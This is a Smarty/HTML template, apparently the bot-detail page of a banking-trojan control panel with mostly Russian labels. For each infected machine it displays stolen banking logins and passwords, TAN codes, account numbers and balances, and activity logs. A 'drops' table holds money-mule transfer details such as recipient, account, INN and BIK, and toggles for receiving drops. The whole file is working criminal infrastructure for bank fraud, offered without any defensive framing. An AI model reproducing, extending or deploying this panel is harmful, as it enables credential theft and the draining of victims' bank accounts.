{if $bot->id ne ''}
<div id="div_sub_{$rand_name}"></div>
<script language="javascript" type="application/javascript">
var id_{$rand_name} = document.getElementById('div_sub_{$rand_name}').parentNode.id.replace('_content', '');
var id_bot_{$rand_name} = '{$bot->id}';
document.getElementById(id_{$rand_name} + '_title').innerHTML = '{$lang.infob} #{$bot->id}';
</script>
{if $nobot eq true}
<hr />
<h2 align="center">{$lang.botnotfound}</h2>
<hr />
{if $bot_uid}
<div style="text-align:center">
{$lang.nbsdpre}
<br />
<a href="/bots/bot-{$bot_uid->id}.html">{$lang.posmtr}</a>
</div>
<hr />
{/if}
{else}
<form name="groups" id="groups">
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;">
<tr class="bgp2">
    <th style="text-align: left; width: 300px;">{$lang.uid}</th>
    <th style="text-align: left;">{$bot->prefix}{$bot->uid}</th>
</tr>
<tr class="bgp1">
    <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left; width: 300px;">Метка</th>
    <th id="l{$rand_name}" style="text-align: left; margin: 5px;"><div class="labels l1" onclick="bls('{$bot->id}', 'l1', 'l{$rand_name}');">{if $bot->label eq 'l1'} OK! {else}&nbsp;{/if}</div>
    <div class="labels l2" onclick="bls('{$bot->id}', 'l2', 'l{$rand_name}');">{if $bot->label eq 'l2'} OK! {else}&nbsp;{/if}</div>
    <div class="labels l3" onclick="bls('{$bot->id}', 'l3', 'l{$rand_name}');">{if $bot->label eq 'l3'} OK! {else}&nbsp;{/if}</div></th>
</tr>
<tr class="bgp1">
    <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">{$lang.ip}</th>
    <th style="text-align: left;">{$bot->ip}</th>
</tr>
{if $bot->version ne ''}
<tr class="bgp1">
    <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">Версия</th>
    <th style="text-align: left;">{$bot->version}</th>
</tr>
{/if}
<tr class="bgp1">
    <th colspan="2">&nbsp;</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">{$lang.system}</th>
    <th style="text-align: left;">{$bot->systems->name} ({$bot->systems->percent}%)</th>
</tr>
</table>

{if $bot->systems->nid eq 'bss'}
<hr />
<h2 align="center">BSS</h2>
<hr />
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;">
<tr class="bgp1">
    <th style="text-align: left; width: 300px;">{$lang.system}</th>
    <th style="text-align: left;">{$bot->info.vconfig}</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">{$lang.dsbld}</th>
    <th style="text-align: left;">{if $bot->info.dsbld eq '1'}{$lang.on}{else}{$lang.off}{/if}</th>
</tr>
<tr class="bgp1">
    <th style="text-align: left;">{$lang.slp}</th>
    <th style="text-align: left;">{if $bot->info.slp eq '1'}{$lang.on}{else}{$lang.off}{/if}</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left;">{$lang.infrm}</th>
    <th style="text-align: left;">{if $bot->info.infrm eq '1'}{$lang.on}{else}{$lang.off}{/if}</th>
</tr>
</table>
{/if}

{if $bot->info.logs.login ne '' && $bot->info.logs.password ne ''}
<br />
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;">
<tr class="bgp1">
    <th style="text-align: left; width: 300px;">Логин</th>
    <th style="text-align: left;">{$bot->info.logs.login}</th>
</tr>
<tr class="bgp2">
    <th style="text-align: left; width: 300px;">Пасс</th>
    <th style="text-align: left;">{$bot->info.logs.password}</th>
</tr>

</table>
<br />
{/if}

{if $bot->info.logs.accAndSumm}
<br />
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;">
<tr class="bgp1">
    <th colspan="2" style="text-align: left; width: 300px;text-align:center">Счета</th>
</tr>
{foreach from=$bot->info.logs.accAndSumm item=item name=as}
{if $smarty.foreach.as.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr class="bgp{$bg}">
    <th style="text-align: left; width: 300px;">{$item.acc}</th>
    <th style="text-align: left;">{$item.summ}</th>
</tr>
{/foreach}
</table>
<br />
{/if}

{if $bot->info.logs.tan}
<br />
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;">
<tr class="bgp1">
    <th colspan="3" style="text-align: left; text-align:center">Tans</th>
</tr>
{foreach from=$bot->info.logs.tan item=item name=at}
{if $smarty.foreach.at.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr class="bgp{$bg}">
    <th style="text-align: left;">{$item.0}</th>
    <th style="text-align: left;  width: 30%;">{$item.1}</th>
    <th style="text-align: left;  width: 30%;">{$item.2|date_format:"%d/%m/%Y %H:%M"}</th>
</tr>
{/foreach}
</table>
<br />
{/if}

{if $bot->systems->nid eq 'alpha'}
<hr />
<h2 align="center">Alpha</h2>
<hr />
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;">
<tr class="bgp1">
    <th style="text-align: left; width: 300px;">Получать дропа</th>
    <th style="text-align: left;">{if $bot->info.getdrop eq '1'}{$lang.off}{else}{$lang.on}{/if}</th>
</tr>
</table>
{/if}

{if $bot->balance|@count >= 1}
<hr />
<h2 align="center">{$lang.lbq}</h2>
<hr />
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;" align="center">
<tr class="bgp3">
    <th width="20%">{$lang.ip}</th>
    <th width="50%">{$lang.balance}</th>
    <th width="30%">{$lang.data}</th>
</tr>
{foreach from=$bot->balance item=item name=balance}
{if $smarty.foreach.balance.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr class="bgp{$bg}">
    <th>{$item->ip}</th>
    <th>{$item->balance}</th>
    <th>{$item->post_date}</th>
</tr>
{/foreach}
</table>
{/if}

{if $bot->logs|@count >= 1}
<hr />
<h2 align="center">{$lang.logss}</h2>
<hr />
<div id="logs{$rand_name}">
<div id="lp_{$bot->id}_{$rand_name}" align="center">{$logs_pages}</div>
<br />
<table cellspacing="1" cellpadding="0" style="width: 100%; border: 1px solid #cccccc;" align="center">
<tr class="bgp3">
    <th width="15%">{$lang.ip}</th>
    <th width="50%">{$lang.log}</th>
    <th width="10%">{$lang.version}</th>
    <th width="25%">{$lang.data}</th>
 </tr>
{foreach from=$bot->logs item=item name=logs}
{if $smarty.foreach.logs.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr class="bgp{$bg}">
    <th>{$item->ip}</th>
    <th>{$item->log}</th>
    <th>{$item->version}</th>
    <th>{$item->post_date}</th>
</tr>
{/foreach}
</table>
</div>
{/if}

{if $bot->drops_data|@count >= 1}
<hr />
<h2 align="center">{$lang.ldq}</h2>
<hr />
<table cellspacing="1" cellpadding="3" style="width: 100%; border: 1px solid #cccccc;" align="center">
<tr class="bgp3">
    <th style="min-width:300px;">{$lang.infodrop}</th>
    <th width="5%">{$lang.sume}</th>
    <th width="8%">{$lang.status}</th>
    <th width="8%">{$lang.ip}</th>
    <th width="8%">{$lang.data}</th>
</tr>
{foreach from=$bot->drops_data item=item name=drops_data}
{if $smarty.foreach.drops_data.iteration is not even}{assign var=bg value=1}{else}{assign var=bg value=2}{/if}
<tr class="bgp{$bg}">
    <th style="font-size:9px; text-align:left; padding-left: 20px">
    {getdi($item->info)}
    {if $item->info->trans->docnum ne ''}Номер: {$item->info->trans->docnum}<br />{/if}
    {if $item->info->drop->name ne ''}{$lang.name}: {$item->info->drop->name}<br />{/if}
    {if $item->info->drop->receiver ne ''}{$lang.receiver}: {$item->info->drop->receiver}<br />{/if}
    {if $item->info->drop->destination ne ''}{$lang.destination}: {$item->info->drop->destination}<br />{/if}
    {if $item->info->drop->acc ne ''}{$lang.acc}: {$item->info->drop->acc}<br />{/if}
    {if $item->info->drop->from ne ''}{$lang.from}: {$item->info->drop->from}<br />{/if}
    {if $item->info->drop->to ne ''}{$lang.to}: {$item->info->drop->to}<br />{/if}
    {if $item->info->drop->vat ne ''}{$lang.vat}: {$item->info->drop->vat}%<br />{/if}
    {if $item->info->drop->other.kppb ne ''}{$lang.dkppb}: {$item->info->drop->other.kppb}<br />{/if}
    {if $item->info->drop->other.bik ne ''}{$lang.dbik}: {$item->info->drop->other.bik}<br />{/if}
    {if $item->info->drop->other.BnkKOrrAcnt ne ''}{$lang.dsbp}: {$item->info->drop->other.BnkKOrrAcnt}<br />{/if}
    {if $item->info->drop->other.inn ne ''}{$lang.inn}: {$item->info->drop->other.inn}<br />{/if}
    {if $item->info->drop->other.kppp ne ''}{$lang.dkppp}: {$item->info->drop->other.kppp}<br />{/if}
    {if $item->info->system->vat ne 0}{$lang.vate}: {$item->info->system->vat}<br />{/if}
    </th>
    <th>{if $item->info->system->sum ne ''}{$item->info->system->sum}{else}-{/if}</th>
    
    {if $item->system eq 'bss'}
    <th>{if $lang.bss_status[$item->status]}{$lang.bss_status[$item->status]}{else}{$item->status}{/if}<br /><br />{if $item->passiv eq 1}Пасив{else}Актив{/if}</th>
    {else}
    <th>{if $item->status eq 1}Получил{elseif $item->status eq 2}Выполнен{else}{$item->status}{/if}<br /><br />{if $item->passiv eq 1}Пасив{else}Актив{/if}</th>
    {/if}
    
    <th>{$item->ip}</th>
    <th>{$item->post_date}</th>
</tr>
{/foreach}
</table>
{/if}
</form>
{/if}
<br />
{else}
<h2 align="center">{$lang.botnotfound}</h2>
{/if}